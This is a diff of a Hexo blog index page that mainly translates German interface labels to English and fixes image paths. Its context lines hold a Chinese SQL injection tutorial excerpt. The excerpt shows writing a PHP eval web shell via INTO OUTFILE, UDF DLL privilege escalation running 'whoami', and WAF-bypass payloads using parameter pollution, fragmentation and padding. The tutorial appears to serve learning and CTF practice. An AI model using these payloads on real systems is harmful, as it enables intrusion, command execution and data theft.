@@ -181,7 +181,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
-            Startseite
+            Home
           </a>
         </li>
       
@@ -191,7 +191,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
-            Archiv
+            Archives
           </a>
         </li>
       
@@ -257,7 +257,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-26T21:56:46+08:00">
                 2018-05-26
@@ -341,7 +341,7 @@
 <p>转移报错</p>
 <figure class="highlight plain"><figcaption><span>convert(concat('a',id),signed)</span><a href="//复现发现回显情况与预期不符```(类型的转换)">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">整形溢出报错</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
 <p>**报错原理之深入研究<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**0x05 基于文件读写权限的注入**</span><br><span class="line">1.条件</span><br><span class="line">需要my.ini(phpstudy中)里面的 secur_file_priv变量为空，不敢一般MySQL5.5.53之前的版本默认为空，之后的版本为null，所以说这种注入比较依赖MySQL的版本。</span><br><span class="line">可以使用：select @@secure_file_priv来查询权限。</span><br><span class="line">关于secur_file_priv变量：</span><br><span class="line">&gt;如果变量设置为目录的名称，则服务器会将导入和导出操作限制在跟这个目录中一起使用。这个目录必须存在，服务器不会自己创建它。</span><br><span class="line">如果变量为空，则不会产生影响，引起不安全的配置。</span><br><span class="line">如果变量设置为NULL，那么服务器就会禁用导入和导出操作。这个值从MySQL 5.5.53版本开始允许。</span><br><span class="line">此外，该系统变量只允许读</span><br><span class="line"></span><br><span class="line">3.一些函数</span><br><span class="line">(1)load_file: 读取文件</span><br><span class="line">(2)into dumpfile/outfile: 将表的内容导出为一个文本文件</span><br><span class="line"></span><br><span class="line">&gt;Tips：</span><br><span class="line">INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符</span><br><span class="line">INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择</span><br><span class="line"></span><br><span class="line">4.演示:</span><br><span class="line">```select * from users into outfile ‘d:/1.txt’;</span><br><span class="line">select load_file(‘d:/1.txt’)</span><br></pre></td></tr></table></figure></p>
-<p><img src="/SQL injection/2.jpg" alt="injection"><br>或者直接写入shell:<br><figure class="highlight plain"><figcaption><span>'<?php eval($_POST['syclover']);?>'into outfile "filepath"```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5.实际:</span><br><span class="line">&lt;li&gt;用菜刀连接</span><br><span class="line">```?id=1&apos;)) union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile &apos;D:/phpStudy/www/1234.php&apos;   --+</span><br></pre></td></tr></table></figure></p>
+<p><img src="./SQL injection/2.jpg" alt="injection"><br>或者直接写入shell:<br><figure class="highlight plain"><figcaption><span>'<?php eval($_POST['syclover']);?>'into outfile "filepath"```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5.实际:</span><br><span class="line">&lt;li&gt;用菜刀连接</span><br><span class="line">```?id=1&apos;)) union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile &apos;D:/phpStudy/www/1234.php&apos;   --+</span><br></pre></td></tr></table></figure></p>
 <p><li>改扩展名绕过操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">6.区别:</span><br><span class="line">dumpfile只能导出一行数据</span><br><span class="line">若我们想把一个可执行2进制文件用into outfile函数导出,</span><br><span class="line">事实上,导出后就会被破坏</span><br><span class="line"> </span><br><span class="line">因为into outfile函数会在行末端写入新行更致命的是会转义换行符</span><br><span class="line">这样的话这个2进制可执行文件就会被破坏</span><br><span class="line"> </span><br><span class="line">这时候我们用into dumpfile就能导出一个完整能执行的2进制文件</span><br><span class="line">into dumpfile函数不对任何列或行进行终止也不执行任何转义处理</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">如在无web脚本执行，但是有mysql root执行的环境下我们就可以通过</span><br><span class="line">into dump函数导入udf.dll进行提权</span><br><span class="line"></span><br><span class="line">```mysql&gt; show variable like &apos;%plugin%&apos;;</span><br></pre></td></tr></table></figure></li></p>
 <p>+—————-+——————————————+<br>|Variable_name   | Value                                    |<br>+—————-+——————————————+<br>| plugin_dir     |c:\mysql\mysql server 5.1\lib/plugin      |<br>+—————-+——————————————+</p>
 <figure class="highlight plain"><figcaption><span>select unhex('udf.dll hex code') into dumpfile 'c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll';</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from func; #查看是否有人创建过udf 如果有就可以省略</span><br><span class="line">mysql&gt; create function MyCmd returns string soname &apos;&apos;c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll&apos;;</span><br><span class="line">mysql&gt; select MyCmd(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure>
@@ -438,16 +438,16 @@
 <p>, &lt;&lt;, &gt;=, &lt;=, &lt;&gt;,&lt;=&gt;,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN<br>使用这些”特殊符号”实现绕过是一件很细微的事情一方面各数据库对符号的处理是不尽相同的另一方面你得充分了解这些符号的特性和使用方法才能会考虑利用其实现绕过<br>(7).HTTP参数控制<br>1.HPP参数污染(HTTP Parameter Polution)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?id=1;select+1&amp;id=2,3+from+users+where+id=1—</span><br><span class="line">/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users</span><br></pre></td></tr></table></figure></p>
 </blockquote>
 </blockquote>
-<p><img src="./source/SQL injection/3.jpg" alt="injection"><br>不再赘述</p>
+<p><img src="./SQL injection/3.jpg" alt="injection"><br>不再赘述</p>
 <p>2.HPF(HTTP Parameter Fragment)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--</span><br><span class="line">select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</span><br></pre></td></tr></table></figure></p>
 <p>看完上面两个示例发现和HPP最后一个示例很像不同之处在于参数不一样这里是在不同的参数之间进行分割结果到了数据库执行查询时再合并语句。</p>
 <p>3.HPC(HTTP Parameter Contamination)<br>RFC2396定义了如下一些字符</p>
 <p>Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ‘ ()<br>Reserved : ; / ? : @ &amp; = + $ ,<br>Unwise : { } | \ ^ [ ] `<br>不同的Web服务器处理处理构造得特殊请求时有不同的逻辑</p>
-<p><img src="./source/SQL injection/4.jpg" alt="injection"></p>
+<p><img src="./SQL injection/4.jpg" alt="injection"></p>
 <p>(8).缓冲区溢出<br>缓冲区溢出用于对付WAF在内的软件，其本身有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制。因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过<br>栗子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br></pre></td></tr></table></figure></p>
 <p>示例0xA*1000指0xA后面”A”重复1000次一般来说对应用软件构成缓冲区溢出都需要较大的测试长度这里1000只做参考也许在有些情况下可能不需要这么长也能溢出<br>意为重复1000次绕过WAF从而使得后面的查询语句不会被过滤而得到执行</p>
 <p>(9).整合绕过<br>结合使用前面谈到的各种绕过技术单一的技术可能无法绕过过滤机制但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说关系到总体与局部和另一方面则是多种技术的使用创造了更多的可能性组合除非每一种技术单独都无法使用否则它们能产生比自身大得多的能量。<br>栗子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…</span><br><span class="line">id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -</span><br><span class="line">?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--</span><br></pre></td></tr></table></figure></p>
-<p>从前面到现在基本上每条注入语句中都有数字如果某查询的数据类型为字符串、或者做了严格限制数字要被和谐掉这就有点棘手了不过办法总是有的<br>即<strong>利用数据库中预定义的数字变量进行bypass</strong><br><img src="./source/SQL injection/5.jpg" alt="injection"><br><img src="./source/SQL injection/6.jpg" alt="injection"><br>上面两张图第一张是不能使用数字时通过使用数学函数得到某个数字的值第二张则是这些数字对应的36进制的值因此有时候一个很简单的表达式可能会很复杂或者非常长其实际就是计算mod(a,b)</p>
+<p>从前面到现在基本上每条注入语句中都有数字如果某查询的数据类型为字符串、或者做了严格限制数字要被和谐掉这就有点棘手了不过办法总是有的<br>即<strong>利用数据库中预定义的数字变量进行bypass</strong><br><img src="./SQL injection/5.jpg" alt="injection"><br><img src="./SQL injection/6.jpg" alt="injection"><br>上面两张图第一张是不能使用数字时通过使用数学函数得到某个数字的值第二张则是这些数字对应的36进制的值因此有时候一个很简单的表达式可能会很复杂或者非常长其实际就是计算mod(a,b)</p>
 <p><code>(mod(length(trim(leading(concat(lower(conv(version()*(true+pi()),pi()*pi(),pow(pi(),pi()))),lower(conv(pi()*pi()*pi()-pi()-pi(),pi()*pi(), pow(pi(),pi()))),lower(conv(pi()*version(),pi()*pi(),pow(pi(),pi()))),conv(version()*(true+pi()),pi()*pi(),pow(pi(),pi())),lower(conv(pi()*pi()*pi()-pi()-pi(),pi()*pi(),pow(pi(),pi()))),lower(conv(pi()*version(),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(pi()*version())+true,pi()*pi(),pow(pi(), pi()))),lower(conv(ceil((pi()+ceil(pi()))*pi()),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(pi())*ceil(pi()+pi()),pi()*pi(),pow(pi(),pi()))),conv(ceil(pi()*version()),pi()*pi(),pow(pi(),pi())),lower(conv(ceil(pi()*pi()+pi()),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(version()*version()),pi()*pi(),pow(pi(),pi()))),lower(conv(ceil(pi()*pi()+pi()),pi()*pi(),pow(pi(),pi())))))from(pass))),length(pass))</code><br><strong>0x16 防御方法</strong></p>
 <p><strong>0x17 几个脚本</strong></p>
 
@@ -527,7 +527,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-13T00:13:42+08:00">
                 2018-05-13
@@ -646,7 +646,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-10T22:51:33+08:00">
                 2018-05-10
@@ -765,7 +765,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-22T13:04:24+08:00">
                 2018-04-22
@@ -821,7 +821,7 @@
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/04/22/DDCTF web1/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
           <!--/noindex-->
@@ -900,7 +900,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-19T16:33:00+08:00">
                 2018-04-19
@@ -1007,7 +1007,7 @@
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/04/19/深入理解浏览器的解析机制/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
           <!--/noindex-->
@@ -1086,7 +1086,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-10T22:18:38+08:00">
                 2018-04-10
@@ -1159,7 +1159,7 @@
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/04/10/The POC of RPO/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
           <!--/noindex-->
@@ -1238,7 +1238,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-02T20:26:19+08:00">
                 2018-04-02
@@ -1292,7 +1292,7 @@
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/04/02/网强杯wp的学习/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
           <!--/noindex-->
@@ -1371,7 +1371,7 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-02T10:56:25+08:00">
                 2018-04-02
@@ -1513,7 +1513,7 @@ print s.[:point]
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-31T12:56:41+08:00">
                 2018-03-31
@@ -1566,7 +1566,7 @@ print s.[:point]
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/03/31/hello-world/#more" rel="contents">
-              Weiterlesen &raquo;
+              Read more &raquo;
             </a>
           </div>
           <!--/noindex-->
@@ -1650,7 +1650,7 @@ print s.[:point]
                 <a href="/archives/">
               
                   <span class="site-state-item-count">9</span>
-                  <span class="site-state-item-name">Artikel</span>
+                  <span class="site-state-item-name">posts</span>
                 </a>
               </div>
             
@@ -1663,7 +1663,7 @@ print s.[:point]
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
                   <span class="site-state-item-count">6</span>
-                  <span class="site-state-item-name">Tags</span>
+                  <span class="site-state-item-name">tags</span>
                 </a>
               </div>
             
@@ -1739,7 +1739,7 @@ print s.[:point]
 </div>
 
 
-  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
 
